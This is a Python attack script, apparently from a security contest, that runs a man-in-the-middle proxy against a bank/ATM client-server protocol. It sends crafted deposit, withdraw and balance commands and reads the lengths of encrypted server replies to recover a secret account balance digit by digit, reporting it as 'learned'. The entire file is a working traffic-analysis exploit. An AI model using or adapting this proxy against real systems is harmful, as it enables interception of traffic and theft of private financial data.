#!/usr/bin/env python3
import socket
import argparse
import threading
import signal
import json
import requests
import sys
import time
import traceback
from queue import Queue
from contextlib import contextmanager

CLIENT2SERVER = 1
SERVER2CLIENT = 2

running = True

"""
"fast" TLS brute-force
@author: Hung Nguyen
"""

ERROR_MARK = 48
MAX_AMOUNT_LEN = 9
MAX_FILE_LENGTH = 4
MAX_ACCOUNT_LENGTH = 11

NEW_COMMAND_FORMAT = '{ "type": "input",' \
                     ' "input":{"input": ["-p","%PORT%","-i","%IP%",' \
                     '"-c","%IM_FILE%","-a","%IM_ACCOUNT%","-n","%IM_AMOUNT%"],"base64": false}}'
DEPOSIT_COMMAND_FORMAT = '{ "type": "input",' \
                         ' "input":{"input": ["-p","%PORT%","-i","%IP%",' \
                         '"-c","%IM_FILE%","-a","%IM_ACCOUNT%","-d","%IM_AMOUNT%"],"base64": false}}'
WITHDRAW_COMMAND_FORMAT = '{ "type": "input",' \
                          ' "input":{"input": ["-p","%PORT%","-i","%IP%",' \
                          '"-c","%IM_FILE%","-a","%IM_ACCOUNT%","-w","%IM_AMOUNT%"],"base64": false}}'
BALANCE_COMMAND_FORMAT = '{ "type": "input",' \
                         ' "input":{"input": ["-p","%PORT%","-i","%IP%",' \
                         '"-c","%IM_FILE%","-a","%IM_ACCOUNT%","-g"],"base64": false}}'

amount_detected = ''
cur_amount_len = 0
next_digit = 0
last_digit = False

cur_file = 0
cur_file_name = None
cur_account = 0
cur_account_name = None

# 0: init (creating account)
# 1: sent acc created, 2: sent init withdraw (checking balance)
# 3: make withdraw/deposit
# 4: check balance
# 5: failed, 6: finished
cur_state = 0
cur_length = 0


def log(m):
    print(m, file=sys.stderr)


def send_command(shared):
    global cur_state
    global cur_length

    global amount_detected
    global cur_amount_len
    global next_digit
    global last_digit

    global cur_file
    global cur_file_name

    global cur_account
    global cur_account_name

    try:
        if cur_state == 0:
            cur_length = float("inf")
            next_digit = 0
            cur_file += 1
            cur_file_name = str(cur_file).zfill(MAX_FILE_LENGTH)
            cur_account += 1
            cur_account_name = str(cur_account).zfill(MAX_ACCOUNT_LENGTH)

            json_command = NEW_COMMAND_FORMAT.replace('%IM_FILE%', cur_file_name) \
                .replace('%IM_ACCOUNT%', cur_account_name).replace('%IM_AMOUNT%', '%AMOUNT%')

            log("[MITM]: found so far: %s" % amount_detected)
            log("[MITM]: sending new: %s" % json_command)
        elif cur_state == 1 and cur_amount_len > 0:
            amount = amount_detected + str('').zfill(MAX_AMOUNT_LEN - cur_amount_len) + '.00'
            json_command = WITHDRAW_COMMAND_FORMAT.replace('%IM_FILE%', cur_file_name) \
                .replace('%IM_ACCOUNT%', cur_account_name).replace('%IM_AMOUNT%', amount)

            log("[MITM]: found so far: %s" % amount_detected)
            log("[MITM]: sending wit: %s" % json_command)
        elif cur_state == 2 or (cur_state == 1 and cur_amount_len == 0):
            cur_state = 2
            json_command = BALANCE_COMMAND_FORMAT.replace('%IM_FILE%', cur_file_name) \
                .replace('%IM_ACCOUNT%', cur_account_name)

            log("[MITM]: found so far: %s -- current length: %d"
                % (amount_detected, cur_length if cur_length != float('inf') else -1))
            log("[MITM]: sending bal: %s" % json_command)
        elif cur_state == 3:
            if next_digit >= 10:
                cur_state = 6
                log("[MITM] failed to brute-force")
                json_command = '{"type": "done"}'
            else:
                amount = '1' + str('').zfill(MAX_AMOUNT_LEN - cur_amount_len - 1) + '.00'

                if last_digit:
                    json_command = DEPOSIT_COMMAND_FORMAT.replace('%IM_FILE%', cur_file_name) \
                        .replace('%IM_ACCOUNT%', cur_account_name).replace('%IM_AMOUNT%', amount)

                    next_digit += 1
                    log("[MITM]: found so far: %s -- current length: %d -- current digit: %d"
                        % (amount_detected, cur_length if cur_length != float('inf') else -1, next_digit))
                    log("[MITM]: sending dep - step: %s" % json_command)
                else:
                    json_command = WITHDRAW_COMMAND_FORMAT.replace('%IM_FILE%', cur_file_name) \
                        .replace('%IM_ACCOUNT%', cur_account_name).replace('%IM_AMOUNT%', amount)

                    next_digit += 1
                    log("[MITM]: found so far: %s -- current length: %d -- current digit: %d"
                        % (amount_detected, cur_length if cur_length != float('inf') else -1, next_digit))
                    log("[MITM]: sending wit - step: %s" % json_command)
        elif cur_state == 4:
            json_command = BALANCE_COMMAND_FORMAT.replace('%IM_FILE%', cur_file_name) \
                .replace('%IM_ACCOUNT%', cur_account_name)

            log("[MITM]: found so far: %s -- current length: %d -- current digit: %d"
                % (amount_detected, cur_length if cur_length != float('inf') else -1, next_digit))
            log("[MITM]: sending bal: %s" % json_command)
        else:
            json_command = '{"type": "done"}'
            log("[MITM]: invalid state")

        # send to command server
        command = json.loads(json_command)
        shared.put(command, block=True)
    except Exception:
        log(traceback.format_exc())


def mitm(buff, direction, shared):
    global cur_state
    global cur_length

    global amount_detected
    global cur_amount_len
    global next_digit
    global last_digit

    # hb = "".join("{:02x}".format(c) for c in buff)

    if direction == CLIENT2SERVER:
        # log("-> %d ->" % len(buff))
        pass
    elif direction == SERVER2CLIENT:
        try:
            log("<- [%d] last digit = %s <-" % (len(buff), str(last_digit)))
            if cur_state == 0 or cur_state == 1:
                cur_state += 1
                send_command(shared)
            elif cur_state == 2:
                cur_length = len(buff)
                cur_state = 3
                send_command(shared)
            elif cur_state == 3:
                if len(buff) == ERROR_MARK:
                    digit_found = 0
                    log("[MITM] found next digit: %s" % str(digit_found))
                    amount_detected += str(digit_found)
                    cur_amount_len += 1
                    if cur_amount_len < MAX_AMOUNT_LEN:
                        next_digit = 0
                        cur_state = 0
                        if cur_amount_len == MAX_AMOUNT_LEN - 1:
                            last_digit = True
                        send_command(shared)
                    else:
                        log("[MITM] found amount: %s" % amount_detected)
                        cur_state = 4
                        finish = {"type": "learned", "variable": "amount", "secret": int(amount_detected)}
                        shared.put(finish, block=True)
                        time.sleep(1)
                        finish = {"type": "done"}
                        shared.put(finish, block=True)
                else:
                    cur_state += 1
                    send_command(shared)
            elif cur_state == 4:
                if ((len(buff) < cur_length and not last_digit)
                        or (len(buff) > cur_length and last_digit)):
                    digit_found = (10 - next_digit) if last_digit else next_digit
                    log("[MITM] found next digit: %s" % str(digit_found))
                    amount_detected += str(digit_found)
                    cur_amount_len += 1
                    if cur_amount_len < MAX_AMOUNT_LEN:
                        next_digit = 0
                        cur_state = 0
                        if cur_amount_len == MAX_AMOUNT_LEN - 1:
                            last_digit = True
                        send_command(shared)
                    else:
                        log("[MITM] found amount: %s" % amount_detected)
                        cur_state = 4
                        finish = {"type": "learned", "variable": "amount", "secret": int(amount_detected)}
                        shared.put(finish, block=True)
                        time.sleep(1)
                        finish = {"type": "done"}
                        shared.put(finish, block=True)
                else:
                    cur_state = 3
                    send_command(shared)
                    # log("<- %d [%d] <-" % (len(buff), cur_message))

        except Exception:
            log(traceback.format_exc())

    return buff


@contextmanager
def ignored(*exceptions):
    try:
        yield
    except exceptions:
        pass


def kill_p(a, b):
    with ignored(Exception):
        a.shutdown(socket.SHUT_RDWR)
        a.close()
        b.shutdown(socket.SHUT_RDWR)
        b.close()
    return


def worker(client, server, n, shared):
    while running:
        b = ""
        with ignored(Exception):
            b = client.recv(4096)
        if len(b) == 0:
            kill_p(client, server)
            return
        try:
            b = mitm(b, n, shared)
        except Exception:
            pass
        try:
            server.send(b)
        except Exception:
            pass
            kill_p(client, server)
            return
    kill_p(client, server)
    return


def signal_handler(sn, sf):
    global running
    running = False


def do_proxy_main(port, remote_host, remote_port):
    signal.signal(signal.SIGTERM, signal_handler)
    workers = []
    p = None

    try:
        shared = Queue()
        p = threading.Thread(target=send_input, args=(args.c, args.d, shared))
        p.start()

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        s.listen(1)
        send_command(shared)
        while running:
            k, a = s.accept()
            v = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            v.connect((remote_host, remote_port))
            t1 = threading.Thread(target=worker, args=(k, v, CLIENT2SERVER, shared))
            t2 = threading.Thread(target=worker, args=(v, k, SERVER2CLIENT, shared))
            t2.start()
            t1.start()
            workers.append((t1, t2, k, v))
    except Exception:
        pass
        signal_handler(None, None)
    for t1, t2, k, v in workers:
        kill_p(k, v)
        t1.join()
        t2.join()
    p.join()
    return


def send_input(host, port, shared):
    global running
    while running:
        try:
            d = shared.get(block=True, timeout=1)
            time.sleep(0.1)
            r = requests.post("http://" + host + ":" + str(port), data={'REQUEST': json.dumps(d)})
            log(r.text)
        except Exception:
            pass
            time.sleep(0.25)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Proxy')
    parser.add_argument('-p', type=int, default=4000, help="listen port")
    parser.add_argument('-s', type=str, default="127.0.0.1", help="server ip address")
    parser.add_argument('-q', type=int, default=3000, help="server port")
    parser.add_argument('-c', type=str, default="127.0.0.1", help="command server")
    parser.add_argument('-d', type=int, default=5000, help="command port")
    args = parser.parse_args()
    print("started")
    sys.stdout.flush()
    do_proxy_main(args.p, args.s, args.q)
